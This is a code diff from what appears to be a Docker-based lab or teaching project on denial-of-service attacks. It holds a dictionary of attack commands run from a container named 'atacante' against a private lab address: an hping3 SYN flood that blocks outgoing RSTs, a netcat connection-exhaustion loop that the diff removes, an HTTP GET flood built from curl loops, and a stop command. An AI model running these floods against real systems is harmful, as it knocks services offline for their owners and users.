@@ -10,11 +10,7 @@ ATAQUES = {
     # Capa 4: SYN Flood LETAL (Bloquea RSTs salientes y ataca con la IP real)
     "syn": "docker exec atacante iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP && docker exec atacante hping3 -S -p 80 --flood 172.20.10.10",
     
-    # Capa 4/7: Agotamiento de Conexiones TCP con Netcat
-    "nc": "docker exec atacante sh -c 'for i in $(seq 1 100); do while true; do nc -w 1 172.20.10.10 80; done & done'",
-    
-    # Capa 7: Agotamiento de CPU (HTTP Get Flood)
-    "http": "docker exec atacante sh -c 'for i in $(seq 1 50); do while true; do curl -s http://172.20.10.10 -o /dev/null; done & done'",
+    "http": "docker exec atacante sh -c 'for i in $(seq 1 20); do while true; do curl -s http://172.20.10.10 -o /dev/null; done & done; wait'",
     
     # Botón de Pánico: Mata todos los procesos y LIMPIA EL FIREWALL del atacante
     "stop": "docker exec atacante pkill hping3; docker exec atacante pkill curl; docker exec atacante pkill nc; docker exec atacante pkill sh; docker exec atacante iptables -F OUTPUT"
